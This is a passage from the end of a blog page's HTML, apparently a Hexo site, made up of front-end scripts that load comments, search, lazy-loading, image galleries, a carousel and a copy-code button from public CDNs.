            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
